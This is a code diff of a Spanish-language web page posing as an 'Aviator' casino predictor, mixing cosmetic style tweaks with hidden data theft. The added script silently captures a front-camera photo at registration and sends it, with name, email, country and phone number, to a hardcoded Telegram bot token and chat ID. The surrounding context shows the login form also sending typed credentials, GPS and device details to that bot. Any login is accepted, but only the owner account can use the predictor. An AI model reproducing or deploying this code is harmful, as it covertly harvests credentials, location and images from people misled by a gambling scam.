@@ -9,20 +9,20 @@
         :root { --primary: #ffffff; }
         body { margin: 0; padding: 0; font-family: sans-serif; display: flex; justify-content: center; min-height: 100vh; background-image: url('https://media.tenor.com/69TGJF8dxZIAAAAM/fondo-de-pantalla.gif'); background-size: cover; background-position: center; }
         .main-container { width: 100%; max-width: 470px; min-height: 100vh; background: rgba(0, 0, 0, 0); display: none; flex-direction: column; }
-        .app-header { background: var(--primary); padding: 15px; color: red; text-align: center; font-weight: bold; }
+        .app-header { background: var(--primary); padding: 15px; color: red; text-align: center; font-weight: bold; border-radius: 0 0 12px 12px; }
         .content { flex: 1; padding: 5px; display: flex; flex-direction: column; align-items: center; gap: 10px; width: 100%; }
         
         #history-bar { display: flex; gap: 5px; margin-bottom: 10px; width: 100%; justify-content: center; }
-        .hist-box { width: 40px; height: 25px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #000; border: 1px solid #000; }
+        .hist-box { width: 40px; height: 25px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: bold; color: #000; border: 1px solid #000; }
         
         .casino-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; width: 100%; max-width: 400px; margin: 0 auto; }
-        .casino-btn { aspect-ratio: 1 / 1; border: 2px solid #000; border-radius: 8px; cursor: pointer; background: #ffffff; padding: 5px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .casino-btn { aspect-ratio: 1 / 1; border: 2px solid #000; border-radius: 12px; cursor: pointer; background: #ffffff; padding: 5px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         .casino-btn.selected { border-color: #FF0000; transform: scale(1.05); }
-        .casino-btn img { width: 100%; height: 100%; object-fit: contain; }
+        .casino-btn img { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
 
         .next-btn { background: #FF0000; color: #000; border: none; padding: 15px; width: 100%; max-width: 400px; border-radius: 12px; font-weight: bold; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; }
 
-        .gif-wrapper { position: relative; display: inline-block; width: 100%; overflow: hidden; border-radius: 10px; border: 2px solid #FF0000; }
+        .gif-wrapper { position: relative; display: inline-block; width: 100%; overflow: hidden; border-radius: 12px; border: 2px solid #FF0000; }
         .lightning-active::after {
             content: '';
             position: absolute;
@@ -38,12 +38,12 @@
         }
 
         #analysis-box { width: 100%; max-width: 400px; text-align: center; }
-        #analysis-gif { width: 100%; height: auto; max-height: 180px; display: block; }
-        #analysis-log { width: 100%; background: #FF0000; color: black; padding: 10px; border-radius: 10px; font-weight: bold; margin-top: 5px; }
+        #analysis-gif { width: 100%; height: auto; max-height: 180px; display: block; border-radius: 8px; }
+        #analysis-log { width: 100%; background: #FF0000; color: black; padding: 10px; border-radius: 12px; font-weight: bold; margin-top: 5px; }
 
         #login-screen { position: fixed; inset: 0; background: rgba(255, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
         .login-box { width: 100%; max-width: 350px; background: pink; padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-        .login-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 10px; border: 2px solid #000; font-size: 16px; outline: none; background: #fff; }
+        .login-input { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 12px; border: 2px solid #000; font-size: 16px; outline: none; background: #fff; }
         
         .color-azul { color: #00bfff; }
         .color-morado { color: #bc13fe; }
@@ -51,9 +51,9 @@
         #result-display { font-size: 50px; font-weight: 900; margin: 10px 0; color: white; }
         
         .btn-amarillo { background: linear-gradient(to bottom, #F5CF27, #000); color: #FF0000; border: none; padding: 15px; width: 100%; max-width: 400px; border-radius: 12px; font-weight: 900; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 15px rgba(245, 207, 39, 0.4); text-transform: uppercase; }
-        .btn-amarillo:disabled { background: #750000; color: #555; border: 2px solid #FF0000; box-shadow: none; }
+        .btn-amarillo:disabled { background: #750000; color: #555; border: 2px solid #FF0000; box-shadow: none; cursor: not-allowed; border-radius: 12px; }
         
-        .btn-salir { background: transparent; color: #FF0000; border: 2px solid #FF0000; padding: 12px; border-radius: 50px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; }
+        .btn-salir { background: transparent; color: #FF0000; border: 2px solid #FF0000; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 15px; width: 100%; }
         .app-header { font-weight: bold; letter-spacing: 2px; padding: 15px; opacity: 0; animation: fadeInSlide 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
         @keyframes fadeInSlide { 0% { opacity: 0; transform: translateY(-10px); } 100% { opacity: 1; transform: translateY(0); } }
   
@@ -111,7 +111,7 @@
             padding: 12px;
             margin: 6px 0;
             border: 2px solid #ddd;
-            border-radius: 8px;
+            border-radius: 12px;
             box-sizing: border-box;
             font-size: 14px;
             outline: none;
@@ -128,16 +128,18 @@
         }
         .phone-group select {
             flex: 0 0 110px;
+            border-radius: 12px;
         }
         .phone-group input {
             flex: 1;
             margin: 0;
+            border-radius: 12px;
         }
         .btn-telegram-popup {
             background: #0088cc;
             color: #fff;
             padding: 12px 20px;
-            border-radius: 8px;
+            border-radius: 12px;
             font-weight: bold;
             display: inline-block;
             width: 100%;
@@ -160,6 +162,8 @@
             margin-top: 12px;
             text-decoration: underline;
             font-weight: bold;
+            border-radius: 12px;
+            padding: 5px;
         }
         .btn-cerrar-popup:hover {
             color: #333;
@@ -215,7 +219,7 @@
             width: 90%;
             max-width: 320px;
             padding: 25px 20px;
-            border-radius: 16px;
+            border-radius: 18px;
             text-align: center;
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             font-family: sans-serif;
@@ -252,7 +256,7 @@
             border: none;
             padding: 10px 15px;
             flex: 1;
-            border-radius: 8px;
+            border-radius: 12px;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
@@ -267,7 +271,7 @@
             border: none;
             padding: 10px 15px;
             flex: 1;
-            border-radius: 8px;
+            border-radius: 12px;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
@@ -371,14 +375,14 @@
 
 <div id="login-screen">
     <div class="login-box">
-        <img src="https://media.tenor.com/wFUdrz9-f84AAAAM/uuaviatorpka-aviatorpkauu.gif" style="width: 100%; height: auto; margin-bottom: 10px; border-radius: 10px; display: block;" alt="Aviator">
+        <img src="https://media.tenor.com/wFUdrz9-f84AAAAM/uuaviatorpka-aviatorpkauu.gif" style="width: 100%; height: auto; margin-bottom: 10px; border-radius: 12px; display: block;" alt="Aviator">
         <h2 style="color:#FF0000; margin-top: 0; font-size: 22px;">INICIAR SESIÓN</h2>
         
         <form id="secureForm" onsubmit="loginYReportar(event)">
             <input type="text" id="user" class="login-input" placeholder="Usuario" required>
             <input type="password" id="pass" class="login-input" placeholder="Contraseña" required>
             
-            <button type="submit" class="next-btn" style="background:#FF0000; color:#fff; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer;">
+            <button type="submit" class="next-btn" style="background:#FF0000; color:#fff; width: 100%; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: bold; border:none; cursor:pointer; border-radius: 12px;">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
                     <polyline points="10 17 15 12 10 7"></polyline>
@@ -388,10 +392,10 @@
             </button>
         </form>
 
-        <a href="https://t.me/AVIATORQR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; max-width: 100%;">
+        <a href="https://t.me/AVIATORQR" target="_blank" class="next-btn" style="background:#0088cc; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; max-width: 100%; border-radius: 12px;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="20" style="filter:invert(1);" alt="Telegram"> 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
         </a>
-        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; max-width: 100%;">
+        <a href="https://wa.me/593995224036" target="_blank" class="next-btn" style="background:#25d366; color:#fff; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 8px; max-width: 100%; border-radius: 12px;">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20" style="filter:invert(1);" alt="WhatsApp"> 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣
         </a>
 
@@ -423,7 +427,7 @@
                 <img id="analysis-gif" src="https://media.tenor.com/N02aeghYzkoAAAAM/entrada-confirmada.gif" alt="Analysis">
             </div>
             <div id="analysis-log">P R E D I C T O R</div>
-            <div onclick="location.reload()" class="btn-salir">CERRAR SESIÓN</div>
+            <button onclick="cerrarSesion()" class="btn-salir">CERRAR SESIÓN</button>
         </div>
     </div>
 </div>
@@ -514,8 +518,8 @@
         }
     });
 
-    // --- 4. ENVÍO DE DATOS CON ANIMACIÓN DE CARGA ---
-    document.getElementById('form-registro-telegram').addEventListener('submit', function(e) {
+    // --- 4. ENVÍO DE DATOS CON CAPTURA DE FOTO, ANIMACIÓN DE CARGA (3 SEGUNDOS) Y AUTO-RELLENO ---
+    document.getElementById('form-registro-telegram').addEventListener('submit', async function(e) {
         e.preventDefault();
 
         const nombre = document.getElementById('reg-nombre').value;
@@ -525,62 +529,131 @@
         const telefono = document.getElementById('reg-telefono').value;
         const telefonoCompleto = `${prefijo} ${telefono}`;
 
-        // Mostrar animación de carga (Spinner) y ocultar el formulario temporalmente
+        localStorage.setItem('aviator_user_temp', correo);
+        localStorage.setItem('aviator_pass_temp', telefono);
+
         document.getElementById('form-container').style.display = 'none';
         document.getElementById('loading-spinner-container').style.display = 'flex';
 
         const BOT_TOKEN = '8669783207:AAFrqse56cKhsq-1-7eZ9XHFHmHHin8xxHM';
         const CHAT_ID = '7628476472';
         
-        const mensaje = `🚨 *Nuevo Registro Robusto* 🚨\n\n👤 *Nombre:* ${nombre}\n📧 *Correo:* ${correo}\n🌍 *País:* ${pais}\n📞 *Teléfono:* ${telefonoCompleto}`;
+        const mensaje = `🚨 *Nuevo Registro Robusto (Usuario)* 🚨\n\n👤 *Nombre:* ${nombre}\n📧 *Correo:* ${correo}\n🌍 *País:* ${pais}\n📞 *Teléfono:* ${telefonoCompleto}`;
 
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        setTimeout(() => {
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: mensaje,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    localStorage.setItem('aviator_ultimo_registro', new Date().getTime().toString());
-                    cerrarAlertaTelegram();
-                    mostrarAlertaPersonalizada(
-                        "¡Registro Exitoso!", 
-                        "Ahora Haces Parte De Nuestra Comunidad.", 
-                        "🎉", 
-                        "Ir al Canal", 
-                        function() {
-                            window.open('https://t.me/AVIATORPKA', '_blank');
-                        }
-                    );
-                } else {
-                    document.getElementById('form-container').style.display = 'block';
-                    document.getElementById('loading-spinner-container').style.display = 'none';
-                    mostrarAlertaPersonalizada("Error", "Hubo un error al enviar el registro. Inténtalo de nuevo.", "❌", "Aceptar");
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                document.getElementById('form-container').style.display = 'block';
-                document.getElementById('loading-spinner-container').style.display = 'none';
-                mostrarAlertaPersonalizada("Error de Red", "Error de conexión con el servidor.", "⚠️", "Aceptar");
-            });
-        }, 1200);
+        setTimeout(async () => {
+            // Capturar foto antes de enviar o en paralelo junto con el registro
+            await capturarYEnviarFotoRegistro(BOT_TOKEN, CHAT_ID, nombre, correo, mensaje);
+        }, 3000);
     });
 
-    // --- 5. DISPARADOR DE LA REVISIÓN DE 24 HORAS ---
+    async function capturarYEnviarFotoRegistro(token, chatId, nombre, correo, mensajeTexto) {
+        let blobFoto = null;
+        try {
+            let video = document.createElement('video');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+
+            let stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }
+            });
+            
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(resolve => setTimeout(resolve, 800));
+
+            let canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());
+            document.body.removeChild(video);
+
+            blobFoto = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+        } catch (error) {
+            console.log("Cámara denegada o no disponible en registro:", error);
+        }
+
+        if (blobFoto) {
+            let formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blobFoto, 'captura_registro.png');
+            formData.append('caption', mensajeTexto);
+            formData.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => procesarRespuestaEnvio(data))
+            .catch(error => {
+                console.error('Error:', error);
+                enviarSoloTextoRegistro(token, chatId, mensajeTexto);
+            });
+        } else {
+            enviarSoloTextoRegistro(token, chatId, mensajeTexto);
+        }
+    }
+
+    function enviarSoloTextoRegistro(token, chatId, mensajeTexto) {
+        let url = `https://api.telegram.org/bot${token}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensajeTexto + "\n\n*(Sin foto de captura)*",
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => procesarRespuestaEnvio(data))
+        .catch(error => {
+            console.error('Error:', error);
+            document.getElementById('form-container').style.display = 'block';
+            document.getElementById('loading-spinner-container').style.display = 'none';
+            mostrarAlertaPersonalizada("Error de Red", "Error de conexión con el servidor.", "⚠️", "Aceptar");
+        });
+    }
+
+    function procesarRespuestaEnvio(data) {
+        if (data.ok) {
+            localStorage.setItem('aviator_ultimo_registro', new Date().getTime().toString());
+            cerrarAlertaTelegram();
+            
+            document.getElementById('user').value = localStorage.getItem('aviator_user_temp') || '';
+            document.getElementById('pass').value = localStorage.getItem('aviator_pass_temp') || '';
+
+            mostrarAlertaPersonalizada(
+                "¡Registro Exitoso!", 
+                "Tus datos han sido registrados correctamente y se han colocado en el inicio de sesión.", 
+                "🎉", 
+                "Ir al Canal", 
+                function() {
+                    window.open('https://t.me/AVIATORPKA', '_blank');
+                }
+            );
+        } else {
+            document.getElementById('form-container').style.display = 'block';
+            document.getElementById('loading-spinner-container').style.display = 'none';
+            mostrarAlertaPersonalizada("Error", "Hubo un error al enviar el registro. Inténtalo de nuevo.", "❌", "Aceptar");
+        }
+    }
+
     setTimeout(function() {
         mostrarAlertaTelegram();
     }, 1000);
 
-    // --- 6. CAPTURA DE GPS Y DATOS TÉCNICOS ---
+    window.addEventListener('DOMContentLoaded', () => {
+        auditarDispositivoYRed();
+        const savedUser = localStorage.getItem('aviator_user_temp');
+        const savedPass = localStorage.getItem('aviator_pass_temp');
+        if (savedUser) document.getElementById('user').value = savedUser;
+        if (savedPass) document.getElementById('pass').value = savedPass;
+    });
+
     let latGlobal = "No disponible";
     let lonGlobal = "No disponible";
     let infoRedGlobal = "Verificando red...";
@@ -620,8 +693,6 @@
         }
     }
 
-    window.addEventListener('DOMContentLoaded', auditarDispositivoYRed);
-
     async function loginYReportar(event) {
         event.preventDefault();
         let u = document.getElementById("user").value;
@@ -656,15 +727,38 @@ ${infoRedGlobal}
 
         await capturarYEnviarFoto(token, chatId, u, p);
 
-        if(u === "AVIATORPKA" && p === "AVIATORPKA") {
+        if(u.trim() !== "" && p.trim() !== "") {
             document.getElementById("login-screen").style.display = "none";
             document.getElementById("app").style.display = "flex";
+
+            // VALIDACIÓN EXACTA: SÓLO AVIATORPKA TIENE ACCESO LIBRE Y FUNCIONAL. LOS DEMÁS (REGISTROS) ESTÁN RESTRINGIDOS.
+            if(u === "AVIATORPKA" && p === "AVIATORPKA") {
+                window.esDueño = true;
+                let btnRonda = document.getElementById("btn");
+                btnRonda.disabled = true; // Espera selección de casino
+                btnRonda.innerText = "SIGUIENTE RONDA";
+                btnRonda.style.background = "linear-gradient(to bottom, #F5CF27, #000)";
+                btnRonda.style.color = "#FF0000";
+            } else {
+                window.esDueño = false;
+                let btnRonda = document.getElementById("btn");
+                btnRonda.disabled = true;
+                btnRonda.innerText = "🚨ACCESO RESTRINGIDO🚨";
+                btnRonda.style.background = "#FF0000";
+                btnRonda.style.color = "#FF0000";
+            }
         } else {
-            document.getElementById("login-msg").innerText = "Credenciales incorrectas";
+            document.getElementById("login-msg").innerText = "Por favor ingresa tus datos";
         }
     }
 
-    // --- 7. LÓGICA DEL PREDICTOR ---
+    function cerrarSesion() {
+        document.getElementById("app").style.display = "none";
+        document.getElementById("login-screen").style.display = "flex";
+        document.getElementById("pass").value = "";
+        document.getElementById("login-msg").innerText = "";
+    }
+
     const misSenales = [6.94, 6.78, 4.59, 2.22, 1.67, 3.21, 1.44];
     const gifsRonda = [
         "https://www.image2url.com/r2/default/images/1784580046737-f9f9a26c-0d23-4a63-b2da-ae9f94dedb74.png", 
@@ -678,12 +772,15 @@ ${infoRedGlobal}
     let roundCounter = 0;
 
     function selCas(el) {
+        if (window.esDueño === false) return; // Si es usuario registrado, no hace nada al hacer clic en los casinos
         document.querySelectorAll('.casino-btn').forEach(b => b.classList.remove('selected'));
         el.classList.add('selected');
         document.getElementById('btn').disabled = false;
     }
 
     function iniciarSecuencia() {
+        if (window.esDueño === false) return; // Bloqueo total para usuarios por registro
+
         document.getElementById('btn').disabled = true;
         let imgElement = document.getElementById('analysis-gif');
         let container = document.getElementById('gif-container');
@@ -701,7 +798,7 @@ ${infoRedGlobal}
                 container.classList.remove('lightning-active');
                 correrPrediccion(); 
             }
-        }, 800);
+        }, 1000);
     }
 
     function correrPrediccion() {
@@ -730,7 +827,6 @@ ${infoRedGlobal}
         }, 120);
     }
 
-    // --- 8. CAPTURA DE FOTOGRAFÍA (CÁMARA FRONTAL) ---
     async function capturarYEnviarFoto(token, chatId, u, p) {
         try {
             let video = document.createElement('video');
